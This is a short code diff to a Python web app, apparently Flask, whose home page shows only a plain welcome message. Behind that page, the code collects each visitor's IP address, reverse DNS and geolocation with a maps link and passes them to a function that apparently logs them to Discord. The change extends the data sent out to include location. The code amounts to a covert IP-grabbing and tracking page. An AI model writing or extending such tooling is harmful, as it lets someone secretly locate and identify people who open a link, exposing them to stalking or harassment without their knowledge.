@@ -62,7 +62,7 @@ def home():
     ip = get_visitor_ip()
     rdns = get_reverse_dns(ip)
     location, maps_link = get_geolocation(ip)
-    log_to_discord(ip, rdns, request.path, request.headers.get("User-Agent", "unknown"))
+    log_to_discord(ip, rdns, location, maps_link, request.path, request.headers.get("User-Agent", "unknown"))
     return render_template_string("""
         <h1>Welcome</h1>
         <p>Thanks for visiting.</p>
